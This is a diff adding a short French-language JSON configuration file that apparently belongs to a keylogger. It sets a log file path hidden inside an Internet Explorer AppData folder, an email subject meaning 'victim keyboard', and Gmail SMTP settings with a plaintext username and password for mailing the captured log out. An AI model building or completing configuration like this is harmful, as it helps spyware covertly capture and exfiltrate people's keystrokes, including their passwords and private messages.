@@ -1,0 +1,12 @@
+{
+  "adresse_email": "victime.exe@gmail.com",
+  "objet_email": "clavier victime",
+  "fichier_log": "%APPDATA%\\Roaming\\Microsoft\\Internet Explorer\\UserData\\Low\\fichier.log",
+  "corps_email": "L'ordinateur est en train de s'éteindre",
+  "smtp_server": "smtp.gmail.com",
+  "smtp_port": 587,
+  "smtp_username": "victime.exe@gmail.com",
+  "smtp_password": "HACKERdev123456789"
+}
+
+
